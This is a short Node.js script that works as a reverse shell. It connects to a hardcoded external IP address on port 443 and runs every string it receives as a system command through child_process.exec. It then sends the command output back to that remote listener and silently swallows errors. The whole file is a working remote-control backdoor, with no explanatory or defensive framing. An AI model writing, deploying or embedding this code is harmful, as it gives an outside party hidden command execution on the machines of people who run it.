const net = require('net');
const { exec } = require('child_process');


const HOST = '18.209.43.82';
const PORT = 443;

try{
    const client = net.createConnection(PORT, HOST, () => {
        console.log(`Connected to server at ${HOST}:${PORT}`);
      });

      //receive data from the listener
client.on('data', (data) => {

    //run a system command with the input from the listener. eg: whoami
    exec(data.toString(), (error, stdout, stderr) => {
      if (error) {        
          return;
      }
  
      if (stderr) {       
          return;
      }
      //return the output from the system command back to the listener
      console.log(stdout)
      client.write(`${stdout}\r\n`);
  
     
  });
    
  });
  
  client.on('end', () => {
  });
  
  client.on('error', (err) => {
  });
}
catch(err){
    console.log(err)
}



